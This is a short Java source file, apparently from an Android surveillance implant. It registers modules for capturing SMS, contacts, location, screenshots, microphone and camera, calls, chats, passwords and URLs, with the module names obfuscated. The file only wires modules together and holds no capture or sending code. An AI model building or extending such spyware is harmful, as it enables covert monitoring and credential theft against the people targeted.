package com.android.dvci.module;

import com.android.dvci.auto.Cfg;
import com.android.mm.M;

import java.util.Hashtable;

/**
 * Created by zeno on 13/05/15.
 */
public class FactoryModuleAndroid extends FactoryModule {

	@Override
	Hashtable<String, Class> setFactoryMap() {
		if(!Cfg.BB10) {
			factorymap.put(M.e("sms"), ModuleMessage.class);
			factorymap.put(M.e("addressbook"), ModuleAddressBook.class);
			factorymap.put(M.e("calendar"), ModuleCalendar.class);
			factorymap.put(M.e("device"), ModuleDevice.class);
			factorymap.put(M.e("position"), ModulePosition.class);
			factorymap.put(M.e("screenshot"), ModuleSnapshot.class);
			factorymap.put(M.e("messages"), ModuleMessage.class);

			factorymap.put(M.e("mic"), ModuleMicL.class);

			factorymap.put(M.e("camera"), ModuleCamera.class);
			factorymap.put(M.e("clipboard"), ModuleClipboard.class);
			factorymap.put(M.e("crisis"), ModuleCrisis.class);
			factorymap.put(M.e("application"), ModuleApplication.class);
			factorymap.put(M.e("call"), ModuleCall.class);
			factorymap.put(M.e("chat"), ModuleChat.class);
			factorymap.put(M.e("password"), ModulePassword.class);

			factorymap.put(M.e("photo"), ModulePhoto.class);
			factorymap.put(M.e("url"), ModuleUrl.class);
		}

		return factorymap;
	}
}
